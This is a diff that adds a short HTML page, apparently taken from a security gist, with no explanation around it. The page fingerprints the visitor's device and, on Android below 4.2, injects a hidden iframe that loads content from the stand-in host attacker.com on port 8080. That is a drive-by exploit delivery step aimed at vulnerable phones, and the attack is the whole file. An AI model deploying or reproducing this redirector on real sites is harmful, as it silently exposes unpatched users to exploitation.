@@ -1,0 +1,17 @@
+<!--
+	https://gist.github.com/joswr1ght/c95363d91eb72ca22bab
+	
+--><html><head><script src="Spec.js/lib/Spec.js"></script></head>
+<body>
+<script>
+	var spec = new Spec();
+	if (spec.isDeviceDetected() && spec.getOS() == "Android" &&
+			parseFloat(spec.getOSVersion()) < 4.2) {
+		var iframe = document.createElement('iframe');
+		iframe.style.display="none";
+		iframe.src = "http://attacker.com:8080";
+		document.body.appendChild(iframe);
+	}
+</script>
+</body>
+</html>
